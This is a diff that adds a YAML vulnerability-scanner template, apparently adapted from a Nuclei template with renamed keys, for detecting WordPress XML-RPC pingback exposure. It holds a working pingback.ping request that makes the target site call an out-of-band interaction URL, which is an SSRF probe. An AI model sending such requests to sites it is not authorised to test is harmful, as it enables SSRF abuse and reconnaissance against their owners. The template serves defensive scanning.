@@ -1,0 +1,48 @@
+id: wp-xmlrpc-pingback-detection
+brief:
+    title: Wordpress XMLRPC - Pingback Detection
+    by: pdteam
+    level: info
+    about: WordPress XML-RPC Pingback Detection refers to the identification and monitoring of XML-RPC Pingback functionality in a WordPress website. This is vulnerable to pingback detection and bruteforce at...
+    label:
+        - wordpress
+        - ssrf
+        - oast
+        - xmlrpc
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/xmlrpc.php'
+      head:
+        Cookie: humans_21909=1
+      signs:
+        - "on": word
+          has:
+            - XML-RPC server accepts POST requests only.
+          in: body
+    - verb: POST
+      to:
+        - '{{BaseURL}}/xmlrpc.php'
+      body: |-
+        <methodCall>
+          <methodName>pingback.ping</methodName>
+          <params>
+            <param>
+              <value>
+                <string>http://{{interactsh-url}}</string>
+              </value>
+            </param>
+            <param>
+              <value>
+                <string>{{BaseURL}}/?p=1</string>
+              </value>
+            </param>
+          </params>
+        </methodCall>
+      signs:
+        - "on": word
+          has:
+            - http
+            - dns
+          in: interactsh_protocol
